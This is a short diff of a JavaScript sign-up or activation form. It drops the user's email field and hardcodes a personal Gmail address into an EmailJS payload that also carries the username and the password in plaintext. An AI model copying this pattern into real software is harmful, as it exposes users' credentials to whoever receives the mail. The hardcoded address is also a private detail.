@@ -2,7 +2,6 @@ document.addEventListener('DOMContentLoaded', () => {
   const form = document.getElementById('activation-form');
   const nome = document.getElementById('nome');
   const cognome = document.getElementById('cognome');
-  const email = document.getElementById('email');
   const username = document.getElementById('username');
   const status = document.getElementById('status');
 
@@ -32,10 +31,10 @@ document.addEventListener('DOMContentLoaded', () => {
     const dati = {
       nome: nome.value,
       cognome: cognome.value,
-      email: email.value,
       username: username.value,
       password: password,
-      plan: "Starter"
+      plan: "Starter",
+      email: "santosuossosimone8@gmail.com" // Email impostata direttamente nello script
     };
 
     emailjs.send('service_chih3ur', 'template_c5slxmt', dati)
